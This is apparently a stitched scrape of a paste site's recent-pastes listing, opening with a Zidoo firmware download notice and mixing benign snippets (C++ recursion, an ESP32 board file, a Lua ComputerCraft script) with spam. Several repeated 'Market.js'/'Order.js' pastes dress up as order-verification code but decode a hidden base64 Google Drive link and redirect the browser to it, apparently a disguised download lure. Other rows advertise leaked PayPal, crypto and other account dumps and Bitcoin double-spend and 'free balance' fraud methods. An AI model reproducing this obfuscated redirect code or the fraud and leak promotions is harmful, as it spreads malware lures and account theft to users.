MODELS: Z9X PRO, Z20 PRO, Z2000 PRO, Z2600, UHD5000
VERSION: v4.3.52 (RTD1619BPD)
RELEASE DATE: 25-04-18
ZIDOO LINK:         https://apidl.zidoo.tv/app/poster/zidoo_poster_RTD1619B_v4.3.52.apk
MCBLUNA MIRROR:     https://1drv.ms/u/c/e0ea6dbeca4dec92/EWx2oi9riMFIsFxmQopY_hQBRG0uWDXk8GM8Jps4Xu8-yg

**********AMLogic S928X Series ***************************************************

This file is for AMLogic S928X Series only:
MODELS: Z9X 8K/Z30 PRO/Z3000 PRO/UHD8000
VERSION: v4.3.52 (AMLS928X)
RELEASE DATE: 25-04-18
ZIDOO LINK:        https://apidl.zidoo.tv/app/poster/zidoo_poster_S928_v4.3.52.apk
MCBLUNA MIRROR:    https://1drv.ms/u/c/e0ea6dbeca4dec92/EROIZLmrvPVNjsCS50DWLS8Bc0zYCbk1cTbzohCcpOxa2w

***********************************************************************************






"
2qu4VTCE,Friends Pairing,Fastrail08,C++,Friday 2nd of May 2025 11:42:52 AM CDT,"#include <bits/stdc++.h>
using namespace std;

vector<int> getVector(vector<int> &v, int level, int number){
    vector<int> newVector;
    //start from index 1 as level is to be ignored and it is present on index 0
    // for(int i = 1; i < v.size(); i++){
    //     if(v[i] != number){
    //         newVector.push_back(v[i]);
    //     }
    // }
    //full array considered, ignore level to avoid self pairing
    for(int i : v){
        if(i != number && i != level){
            newVector.push_back(i);
        }
    }
    return newVector;
}

void getFriendPairs(vector<int> v, string ans, int &count){
    
    //base case
    if(v.size() == 0){
        count++;
        cout << count << '.' << ans << '\n';
        return;
    }
    
    //go single
    vector<int> single = getVector(v, v[0], v[0]);
    getFriendPairs(single, ans + '(' + to_string(v[0] + 1) + ')', count);
    
    //go in pair (every current individual will form pairs with all the people ahead of him only, to avoid duplicacy: (1, 2); (2, 1))
    for(int i = 1; i < v.size(); i++){
        vector<int> pairs = getVector(v, v[0], v[i]);
        getFriendPairs(pairs, ans + '(' + to_string(v[0] + 1) + ',' + to_string(v[i] + 1) + ')', count);
    }
    
}

int main() {
	// your code goes here
    int n;
    cin >> n;
    int count = 0;
    vector<int> v(n);
    for(int i = 0; i < n; i++){
        v[i] = i;
    }
    getFriendPairs(v, """", count);
}
"
ize1J1z9,Market.js,zebmekey,JavaScript,Friday 2nd of May 2025 11:42:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26992/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LKDpN9uC,Stake Free Balance Method,jm33,JavaScript,Friday 2nd of May 2025 11:41:28 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 22430
fUzhjUVj,PayPal with Balance,hubertzoo90,JavaScript,Friday 2nd of May 2025 11:41:23 AM CDT,62712 Accounts Posted On https://t.me/leakzbyeminem
NUPDyifj,Untitled,zebmekey,JavaScript,Friday 2nd of May 2025 11:27:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79562/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jFgRxn1r,Leaked Accounts - Fresh Hits,jm33,JavaScript,Friday 2nd of May 2025 11:25:57 AM CDT,28937 Accounts Posted On https://t.me/leakzbyeminem
Y43R2qb7,Stake Free Balance Method,zebmekey,JavaScript,Friday 2nd of May 2025 11:25:55 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 77011
NQWjt92H,Market.js,WantingTrae,JavaScript,Friday 2nd of May 2025 11:11:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37977/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
szRE7Xah,Chaturbate with Tokens,jm33,JavaScript,Friday 2nd of May 2025 11:10:35 AM CDT,53690 Accounts Posted On https://t.me/leakzbyeminem
9yM8wx9z,Scam Casinos and Stores,zebmekey,JavaScript,Friday 2nd of May 2025 11:10:34 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 63591
47vzZGAD,Example PIO board file,honey_the_codewitch,JSON,Friday 2nd of May 2025 11:03:13 AM CDT,"{
    ""build"": {
      ""arduino"":{
        ""ldscript"": ""esp32s3_out.ld"",
        ""partitions"": ""default_8MB.csv"",
        ""memory_type"": ""dio_opi""
      },
      ""core"": ""esp32"",
      ""extra_flags"": [
          ""-DARDUINO_RUNNING_CORE=1"",
          ""-DARDUINO_EVENT_RUNNING_CORE=1"",
          ""-DBOARD_HAS_PSRAM"",
          ""-DESP32S3_DEV"",
          ""-DARDUINO_USB_MODE=0"",
          ""-DARDUINO_USB_CDC_ON_BOOT=0"",
          ""-mfix-esp32-psram-cache-issue""
      ],
      ""f_cpu"": ""240000000L"",
      ""f_flash"": ""80000000L"",
      ""flash_mode"": ""dio"",
      ""psram_type"": ""opi"",
      ""hwids"": [
        [
          ""0X303A"",
          ""0x1001""
        ]
      ],
      ""mcu"": ""esp32s3"",
      ""variant"": ""esp32s3""
    },
    ""connectivity"": [
      ""wifi""
    ],
    ""debug"": {
      ""default_tool"": ""esp-builtin"",
      ""onboard_tools"": [
        ""esp-builtin""
      ],
      ""openocd_target"": ""esp32s3.cfg""
    },
    ""frameworks"": [
      ""arduino"",
      ""espidf""
    ],
    ""name"": ""Freenove ESP32-S3 WROOM N8R8 (8MB Flash / 8MB PSRAM)"",
    ""upload"": {
      ""flash_size"": ""8MB"",
      ""maximum_ram_size"": 327680,
      ""maximum_size"": 8388608,
      ""require_upload_port"": true,
      ""speed"": 921600
    },
    ""url"": ""https://github.com/Freenove/Freenove_ESP32_S3_WROOM_Board"",
    ""vendor"": ""Freenove""
  }"
xfY5r1am,Untitled,WantingTrae,JavaScript,Friday 2nd of May 2025 10:55:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87641/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yJXHFVZ2,aboba,asshousotn,Lua,Friday 2nd of May 2025 10:55:54 AM CDT,"-- Программа для отображения доступных методов подключенной периферии
-- в модификации Computer Craft для Minecraft

-- Функция для получения и отображения методов периферии
function listPeripheralMethods()
    -- Получаем список всех подключенных периферийных устройств
    local peripherals = peripheral.getNames()
    
    if #peripherals == 0 then
        print(""Нет подключенной периферии."")
        return
    end
    
    print(""Доступная периферия:"")
    print(""-------------------"")
    
    for i, name in ipairs(peripherals) do
        print(i .. "". "" .. name)
        
        -- Подключаемся к периферийному устройству
        local peripheralObj = peripheral.wrap(name)
        
        -- Получаем все методы этого устройства
        local methods = peripheral.getMethods(name)
        
        if #methods == 0 then
            print(""   Нет доступных методов"")
        else
            print(""   Доступные методы:"")
            for j, method in ipairs(methods) do
                print(""   - "" .. method)
            end
        end
        print()
    end
end

-- Основной цикл программы
while true do
    print()
    print(""Меню:"")
    print(""1. Показать методы периферии"")
    print(""2. Выход"")
    
    local choice = tonumber(read())
    
    if choice == 1 then
        listPeripheralMethods()
    elseif choice == 2 then
        break
    else
        print(""Неверный выбор. Попробуйте снова."")
    end
end

print(""Программа завершена."")"
QfGh8CZY,Crypto Accounts,jm33,JavaScript,Friday 2nd of May 2025 10:55:14 AM CDT,89529 Accounts Posted On https://t.me/leakzbyeminem
DL3WES9F,Doublespending using Vanity Wallet,zebmekey,JavaScript,Friday 2nd of May 2025 10:55:12 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 75293
UG93CNKu,Products.js,WantingTrae,JavaScript,Friday 2nd of May 2025 10:40:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29666/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
p6WqfqTE,PayPal with Balance,jm33,JavaScript,Friday 2nd of May 2025 10:39:52 AM CDT,86916 Accounts Posted On https://t.me/leakzbyeminem
75kwLNXq,Abuse RBF in BTC transactions,zebmekey,JavaScript,Friday 2nd of May 2025 10:39:50 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 08559
7rBskNCW,Order.js,WantingTrae,JavaScript,Friday 2nd of May 2025 10:24:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55493/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
